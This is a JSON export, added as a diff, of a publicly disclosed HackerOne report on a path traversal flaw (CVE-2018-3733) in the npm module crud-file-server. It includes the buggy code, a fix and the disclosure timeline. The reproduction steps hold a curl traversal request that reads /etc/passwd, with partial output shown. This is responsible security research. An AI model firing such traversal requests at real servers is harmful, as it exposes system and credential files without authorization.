@@ -1,0 +1,387 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "eveeez", 
+        "khaledibnalwalid", 
+        "vibhuti_nath", 
+        "apapedulimu", 
+        "japz", 
+        "smither", 
+        "beningsnail"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 310690, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-03-04T23:04:00.027Z", 
+    "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal vulnerability in crud-file-server module, which allows to read arbitrary file from the remote server.\n\n## Module\n\n**crud-file-server**\n\nThis package exposes a directory and its children to create, read, update, and delete operations over http.\n\nhttps://www.npmjs.com/package/crud-file-server\n\nversion: 0.7.0\n\nStats\n0 downloads in the last day\n26 downloads in the last week\n220 downloads in the last month\n\n~2500 estimated downloads per year\n\n\n## Description\n\nThis vulnerability is caused by simple mistake in function which should block Path Traversal attempts:\n\n\n```javascript\n// ./node_modules/crud-file-server/crud-file-server.js, line 4:\nvar cleanUrl = function(url) { \n\turl = decodeURIComponent(url);\n\twhile(url.indexOf('..').length > 0) { url = url.replace('..', ''); }\n\treturn url;\n};\n```\n\nAs you can see, condition which checks existence of ```..``` is wrong, because ```url.indexOf()``` returns index of found string or -1 if nothing matches; and has no ```length``` property. Because of that, this condition is always false, thus ```url = url.replace('..', '');``` is never executed.\n\nThe correct condition should be:\n\n```javascript\nwhile(url.indexOf('..') > 0) { url = url.replace('..', ''); }\n```\n\nI've verified that this is enough to fix this vulnerability.\n\n\n## Steps To Reproduce:\n\n- install ```crud-file-server``` module\n\n```\n$ npm install crud-file-server\n```\n\n- run server from command line:\n\n```\n$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080\n```\n\n- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\n```\n\nResult:\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\n*   Trying 127.0.0.1...\n* TCP_NODELAY set\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../etc/passwd HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.54.0\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/octet-stream\n< Content-Length: 6774\n< Date: Wed, 31 Jan 2018 00:01:31 GMT\n< Connection: keep-alive\n<\n##\n# User Database\n#\n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico\n_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false\n(...)\n```\n\nAfter the patch described in **Description** is applied, the result of ```curl``` command is as expected:\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\n*   Trying 127.0.0.1...\n* TCP_NODELAY set\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../etc/passwd HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.54.0\n> Accept: */*\n>\n< HTTP/1.1 500 Internal Server Error\n< Content-Type: application/json\n< Date: Wed, 31 Jan 2018 00:01:49 GMT\n< Connection: keep-alive\n< Content-Length: 71\n<\n* Connection #0 to host 127.0.0.1 left intact\n{\"errno\":-2,\"code\":\"ENOENT\",\"syscall\":\"stat\",\"path\":\"./////etc/passwd\"}\n```\n\n\n\n## Supporting Material/References:\n\nConfiguration:\n\n- macOS 10.13.3\n- Chromium 66.0.3331.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.3\n- npm version: 5.5.1\n- curl 7.54.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows to read content of any file on the server.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "User"
+    }, 
+    "title": "[crud-file-server] Path Traversal allows to read arbitrary file from the server", 
+    "is_member_of_team?": null, 
+    "vote_count": 7, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "crud-file-server", 
+        "max_severity": "critical", 
+        "databaseId": 5800, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": "2018-04-03T23:04:00.119Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2018-3733"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-01T20:29:12.707Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-01T20:29:12.707Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hey @bl4de , thanks a lot for reporting this to us. I was able to reproduce the described behavior and will consider it as a security issue.\n\nRight now, we have a lot of reports in the pipe, would you have time to contact maintainer and offer him to join this report?\n\nThanks again!", 
+            "markdown_message": "<p>Hey <a href=\"/bl4de\">@bl4de</a> , thanks a lot for reporting this to us. I was able to reproduce the described behavior and will consider it as a security issue.</p>\n\n<p>Right now, we have a lot of reports in the pipe, would you have time to contact maintainer and offer him to join this report?</p>\n\n<p>Thanks again!</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2342965, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-16T00:24:14.969Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-16T00:24:14.969Z", 
+            "actor": {
+                "username": "omphalos", 
+                "url": "/omphalos", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 2388404, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-16T00:32:54.320Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-16T00:32:54.320Z", 
+            "actor": {
+                "username": "omphalos", 
+                "url": "/omphalos", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@bl4de @vdeturckheim this is fixed and published.\n\n@bl4de thanks again for your help with this!", 
+            "markdown_message": "<p><a href=\"/bl4de\">@bl4de</a> <a href=\"/vdeturckheim\">@vdeturckheim</a> this is fixed and published.</p>\n\n<p><a href=\"/bl4de\">@bl4de</a> thanks again for your help with this!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2388413, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-16T00:42:32.535Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-16T00:42:32.535Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@vdeturckheim - I can confirm issue is fixed, I can't reproduce anymore.\n\n@omphalos You're welcome, I'm glad I was able to help you to fix those security issues in your package :)\n", 
+            "markdown_message": "<p><a href=\"/vdeturckheim\">@vdeturckheim</a> - I can confirm issue is fixed, I can&#39;t reproduce anymore.</p>\n\n<p><a href=\"/omphalos\">@omphalos</a> You&#39;re welcome, I&#39;m glad I was able to help you to fix those security issues in your package :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2388421, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-17T18:58:28.999Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-17T18:58:28.999Z", 
+            "actor": {
+                "username": "omphalos", 
+                "url": "/omphalos", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@vdeturckheim can this issue be resolved and disclosed please?", 
+            "markdown_message": "<p><a href=\"/vdeturckheim\">@vdeturckheim</a> can this issue be resolved and disclosed please?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2395182, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bl4de", 
+                "url": "/bl4de"
+            }, 
+            "created_at": "2018-02-18T15:53:59.938Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-18T15:53:59.938Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2401764, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-18T15:54:29.441Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-18T15:54:29.441Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I will request a CVE and disclose when it is assigned.", 
+            "markdown_message": "<p>I will request a CVE and disclose when it is assigned.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2401767, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "old_scope": "Other module", 
+            "created_at": "2018-02-22T19:53:12.022Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-22T19:53:12.022Z", 
+            "actor": {
+                "username": "reed", 
+                "url": "/reed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "new_scope": "crud-file-server", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ChangedScope", 
+            "id": 2422992, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-22T19:53:35.955Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-22T19:53:35.955Z", 
+            "actor": {
+                "username": "reed", 
+                "url": "/reed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "cve_ids": [
+                "CVE-2018-3733"
+            ], 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::CveIdAdded", 
+            "id": 2422993, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-04T23:04:00.071Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-04T23:04:00.071Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2456395, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-03T23:04:07.546Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-03T23:04:07.546Z", 
+            "actor": {
+                "url": "/nodejs-ecosystem", 
+                "profile": {
+                    "name": "Node.js third-party modules"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+                }
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2562673, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bl4de", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bl4de", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 19, 
+        "name": "Path Traversal"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -21338507.74137785, 
+    "disclosed_at": "2018-04-03T23:04:07.517Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/310690", 
+    "created_at": "2018-01-31T00:14:17.515Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi Guys,</p>\n\n<p>There is Path Traversal vulnerability in crud-file-server module, which allows to read arbitrary file from the remote server.</p>\n\n<h2 id=\"module\">Module</h2>\n\n<p><strong>crud-file-server</strong></p>\n\n<p>This package exposes a directory and its children to create, read, update, and delete operations over http.</p>\n\n<p><a title=\"https://www.npmjs.com/package/crud-file-server\" href=\"/redirect?signature=26cd6fdb65243d8c5176af8b61ba979874a2f80e&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fcrud-file-server\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/crud-file-server</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>version: 0.7.0</p>\n\n<p>Stats<br>\n0 downloads in the last day<br>\n26 downloads in the last week<br>\n220 downloads in the last month</p>\n\n<p>~2500 estimated downloads per year</p>\n\n<h2 id=\"description\">Description</h2>\n\n<p>This vulnerability is caused by simple mistake in function which should block Path Traversal attempts:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// ./node_modules/crud-file-server/crud-file-server.js, line 4:</span>\n<span class=\"kd\">var</span> <span class=\"nx\">cleanUrl</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">url</span><span class=\"p\">)</span> <span class=\"p\">{</span> \n    <span class=\"nx\">url</span> <span class=\"o\">=</span> <span class=\"nb\">decodeURIComponent</span><span class=\"p\">(</span><span class=\"nx\">url</span><span class=\"p\">);</span>\n    <span class=\"k\">while</span><span class=\"p\">(</span><span class=\"nx\">url</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span><span class=\"s1\">&#39;..&#39;</span><span class=\"p\">).</span><span class=\"nx\">length</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"nx\">url</span> <span class=\"o\">=</span> <span class=\"nx\">url</span><span class=\"p\">.</span><span class=\"nx\">replace</span><span class=\"p\">(</span><span class=\"s1\">&#39;..&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;&#39;</span><span class=\"p\">);</span> <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"nx\">url</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n</code></pre>\n<p>As you can see, condition which checks existence of <code>..</code> is wrong, because <code>url.indexOf()</code> returns index of found string or -1 if nothing matches; and has no <code>length</code> property. Because of that, this condition is always false, thus <code>url = url.replace(&#39;..&#39;, &#39;&#39;);</code> is never executed.</p>\n\n<p>The correct condition should be:</p>\n<pre class=\"highlight javascript\"><code><span class=\"k\">while</span><span class=\"p\">(</span><span class=\"nx\">url</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span><span class=\"s1\">&#39;..&#39;</span><span class=\"p\">)</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"nx\">url</span> <span class=\"o\">=</span> <span class=\"nx\">url</span><span class=\"p\">.</span><span class=\"nx\">replace</span><span class=\"p\">(</span><span class=\"s1\">&#39;..&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;&#39;</span><span class=\"p\">);</span> <span class=\"p\">}</span>\n</code></pre>\n<p>I&#39;ve verified that this is enough to fix this vulnerability.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ul>\n<li>install <code>crud-file-server</code> module</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ npm install crud-file-server\n</code></pre>\n<ul>\n<li>run server from command line:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080\n</code></pre>\n<ul>\n<li>use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\n</code></pre>\n<p>Result:</p>\n<pre class=\"highlight plaintext\"><code>$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\n*   Trying 127.0.0.1...\n* TCP_NODELAY set\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n&gt; GET /../../../../etc/passwd HTTP/1.1\n&gt; Host: 127.0.0.1:8080\n&gt; User-Agent: curl/7.54.0\n&gt; Accept: */*\n&gt;\n&lt; HTTP/1.1 200 OK\n&lt; Content-Type: application/octet-stream\n&lt; Content-Length: 6774\n&lt; Date: Wed, 31 Jan 2018 00:01:31 GMT\n&lt; Connection: keep-alive\n&lt;\n##\n# User Database\n#\n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico\n_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false\n(...)\n</code></pre>\n<p>After the patch described in <strong>Description</strong> is applied, the result of <code>curl</code> command is as expected:</p>\n<pre class=\"highlight plaintext\"><code>$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\n*   Trying 127.0.0.1...\n* TCP_NODELAY set\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n&gt; GET /../../../../etc/passwd HTTP/1.1\n&gt; Host: 127.0.0.1:8080\n&gt; User-Agent: curl/7.54.0\n&gt; Accept: */*\n&gt;\n&lt; HTTP/1.1 500 Internal Server Error\n&lt; Content-Type: application/json\n&lt; Date: Wed, 31 Jan 2018 00:01:49 GMT\n&lt; Connection: keep-alive\n&lt; Content-Length: 71\n&lt;\n* Connection #0 to host 127.0.0.1 left intact\n{&quot;errno&quot;:-2,&quot;code&quot;:&quot;ENOENT&quot;,&quot;syscall&quot;:&quot;stat&quot;,&quot;path&quot;:&quot;./////etc/passwd&quot;}\n</code></pre>\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<p>Configuration:</p>\n\n<ul>\n<li>macOS 10.13.3</li>\n<li>Chromium 66.0.3331.0 (Developer Build) (64-bit) </li>\n<li>Node.js version: v8.9.3</li>\n<li>npm version: 5.5.1</li>\n<li>curl 7.54.0</li>\n</ul>\n\n<p>Please feel free to invite module maintainer to this report. I haven&#39;t contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.</p>\n\n<p>I hope my report will help to keep Node.js ecosystem and its users safe in the future.</p>\n\n<p>Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>This vulnerability allows to read content of any file on the server.</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://nodejs.org/en/security/", 
+            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
+            "twitter_handle": "", 
+            "name": "Node.js third-party modules"
+        }, 
+        "handle": "nodejs-ecosystem", 
+        "url": "https://hackerone.com/nodejs-ecosystem", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 23949, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
